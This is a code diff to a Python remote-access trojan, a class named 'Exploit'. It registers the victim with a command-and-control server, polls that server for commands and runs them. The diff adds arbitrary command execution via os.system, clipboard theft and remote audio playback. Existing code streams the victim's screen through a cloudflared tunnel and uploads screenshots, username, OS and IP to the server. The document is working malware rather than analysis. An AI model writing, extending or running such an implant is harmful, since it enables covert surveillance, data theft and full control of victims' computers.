@@ -5,6 +5,7 @@ import socket
 import webbrowser
 import threading
 import pyperclip
+import pygame
 import pyautogui
 import requests
 import platform
@@ -12,15 +13,18 @@ import time
 import sys
 import os
 import re
+import io
+
 
 class Exploit:
     def __init__(self):
-        self.url = "https://meterpreter.pythonanywhere.com/"
+        self.url = "http://192.168.8.113:8000" #"https://meterpreter.pythonanywhere.com/"
         self.os_name = self.get_os_name()
         self.pattern = r"\s+",
         self.target = re.sub(r"\s+", "", subprocess.run('whoami',shell=True,capture_output=True,text=True).stdout)
-        self.ip = socket.gethostbyname(socket.gethostname())
+        self.ip = "192.168.8.113"#socket.gethostbyname(socket.gethostname())
         self.T = True
+        self.mixer = pygame.mixer.init()
         self.tunnel_process = None
         self.register()
 
@@ -81,7 +85,7 @@ class Exploit:
         with mss() as sct:
             monitor = sct.monitors[1]
             while self.T:
-                stream_screen(sct,monitor,f'http://{self.ip}:8000/register/upload_stream/',"monster",0.02)
+                stream_screen(sct,monitor,f'http://{self.ip}:8000/api/upload_stream/',"monster",0.02)
     
     def hundle_command(self, command):
         if command.startswith("cd"):
@@ -105,12 +109,24 @@ class Exploit:
         elif command.startswith('browser'):
             webbrowser.open(self.clean_message("browser",command))
             exc = "the browser will open in any minute!!!"
-
+        elif command.startswith('$play'):
+            try:
+                self.play_sound(command)
+                exc = "The sound will start playing"
+            except Exception as e:
+                exc = f"The sound can't be played due error : {e}"
+        elif command == '$stop':
+            exc = "The sound will stop playing"
+            self.stop_sound()
+        elif command == '$copyed':
+            exc = 'result : '+pyperclip.paste()
+        elif command.startswith('$excute'):
+            os.system(self.clean_message("$excute", command))
         elif command in ["screenshare","stream"]:
             url = self.launch_cloudflared_tunnel(8000)
             t1 = threading.Thread(target=self.share_screen)
             t1.start()
-            exc =f"stream started by {self.target} at {url}/register/stream/{self.target}/"
+            exc =f"stream started by {self.target} at {url}/api/stream/{self.target}/"
 
         elif command in ['stop screenshare',"stop stream"]:
             exc = self.stop_screen_share()
@@ -120,15 +136,19 @@ class Exploit:
     
     
     def reverce_http(self):
-        commands = requests.get(f'{self.url}/register/commands?target={self.target}').json()
-        requests.delete(f'{self.url}/register/commands?target={self.target}')
+        commands = requests.get(f'{self.url}/api/commands/?target={self.target}').json()
+        requests.delete(f'{self.url}/api/commands/?target={self.target}')
         if type(commands) == list:
             for cm in commands:
                 command = cm["command"]
                 print(command+' recived')
-                exc = self.hundle_command(command)
+                try:
+                    exc = self.hundle_command(command)
+                except Exception as e:
+                    exc = f'Command could not be excuted due erro : {e}'
+                
                 if exc:
-                    requests.post(f'{self.url}/register/log',json={
+                    requests.post(f'{self.url}/api/log/',json={
                         'target': self.target,
                         'log': exc,
                         'command': command,
@@ -136,8 +156,8 @@ class Exploit:
             
     
     def register(self):
-        requests.post(f'{self.url}/register/states',json={"target":self.target,"state":"Connected","os":self.os_name})
-        requests.post(f'{self.url}/register/victime', json={
+        requests.post(f'{self.url}/api/states/',json={"target":self.target,"state":"Connected","os":self.os_name})
+        requests.post(f'{self.url}/api/victime/', json={
             "name" : self.target,
             "os" : self.os_name,
             "ip" : self.ip,
@@ -147,7 +167,7 @@ class Exploit:
     def screenshot(self):
         screenshot = pyautogui.screenshot()
         screenshot.save(".upls/screenshot.png")
-        url = f"{self.url}/register/uploads"
+        url = f"{self.url}/api/uploads"
         files = {"file": open(".upls/screenshot.png", "rb")}
         response = requests.post(url,json={"target":self.target},files=files)
         os.remove(".upls/screenshot.png")
@@ -157,8 +177,8 @@ class Exploit:
             return "Upload failed:", response.status_code, response.text
         
     def clean_up(self):
-        requests.delete(f'{self.url}/register/victime?name={self.target}')
-        requests.post(f'{self.url}/register/states',json={"target":self.target,"state":"Disconnected"})
+        requests.delete(f'{self.url}/api/victime/?name={self.target}')
+        requests.post(f'{self.url}/api/states/',json={"target":self.target,"state":"Disconnected"})
 
     def clean_message(self,keyword,word):
         word = word.split(keyword,1)[1][1:]
@@ -172,6 +192,14 @@ class Exploit:
         except KeyboardInterrupt:
             self.clean_up()
 
+    def play_sound(self,song):
+        song = self.clean_message("$play",song)
+        response = requests.get(song)
+        mp3_stream = io.BytesIO(response.content)
+        pygame.mixer.music.load(mp3_stream)
+        pygame.mixer.music.play()
 
+    def stop_sound(self):
+        self.mixer.stop()
 
 Exploit().main()
